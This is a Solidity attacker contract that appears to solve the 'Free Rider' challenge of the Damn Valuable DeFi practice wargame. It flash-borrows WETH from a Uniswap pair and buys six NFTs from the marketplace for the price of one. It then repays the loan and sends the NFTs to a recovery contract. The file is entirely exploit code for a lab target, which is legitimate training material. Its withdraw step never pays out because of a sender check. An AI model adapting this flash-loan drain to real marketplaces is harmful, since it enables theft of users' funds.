// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "../DamnValuableNFT.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../free-rider/FreeRiderRecovery.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "solmate/src/tokens/WETH.sol";

contract FreeRiderAttacker is IERC721Receiver, IUniswapV2Callee {
    uint256 private constant _NFT_PRICE = 15 ether;

    FreeRiderNFTMarketplace private _marketplace;
    FreeRiderRecovery private _recovery;
    DamnValuableNFT private _nft;
    IUniswapV2Pair private _pair;
    WETH private _weth;
    address _owner;

    address token0;
    address token1;

    constructor(
        address payable marketplace,
        address recovery,
        address nft,
        address pair,
        address payable weth,
        address player
    ) payable {
        _marketplace = FreeRiderNFTMarketplace(marketplace);
        _recovery = FreeRiderRecovery(recovery);
        _nft = DamnValuableNFT(nft);
        _pair = IUniswapV2Pair(pair);
        _weth = WETH(weth);
        _owner = player;
    }

    function attack() external {
        // swap을 위해서는 아래의 data가 반드시 필요하다.
        bytes memory data = abi.encode(address(_weth), msg.sender);

        _pair.swap(_NFT_PRICE, uint(0), address(this), data);
    }

    // callback function of _pair.swap(need to implement IUniswapV2Callee interface)
    function uniswapV2Call(
        address,
        uint256 amount0,
        uint256,
        bytes calldata
    ) external override {
        if (msg.sender != address(_pair)) return;

        _weth.withdraw(amount0);

        uint256[] memory tokenIds = new uint256[](6);

        for (uint256 i = 0; i < 6; ) {
            tokenIds[i] = i;
            unchecked {
                i++;
            }
        }

        // attack logic
        _marketplace.buyMany{value: _NFT_PRICE}(tokenIds);

        // repay
        uint256 rePayCost = ((amount0 * 103) / 100);
        _weth.deposit{value: rePayCost}();
        _weth.transfer(address(_pair), rePayCost);

        // transfer NFTs to _recovery
        for (uint256 i = 0; i < 6; i++) {
            _nft.approve(address(_recovery), i);
            // bytes memory callData = abi.encodeWithSignature(
            //     "safeTransferFrom(address,address,uint256,bytes)",
            //     address(this),
            //     address(_recovery),
            //     i,
            //     abi.encode(address(this))
            // );

            // (bool success, ) = address(_nft).call(callData);
            // require(success, "Transfer failed");
            bytes memory data = abi.encode(address(_owner));
            _nft.safeTransferFrom(address(this), address(_recovery), i, data);
        }

        withdraw();
    }

    function withdraw() private {
        if (msg.sender != _owner) return;
        (bool success, ) = _owner.call{value: address(this).balance}("");
        require(success, "Failed to send Ether");
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
    fallback() external payable {}
}
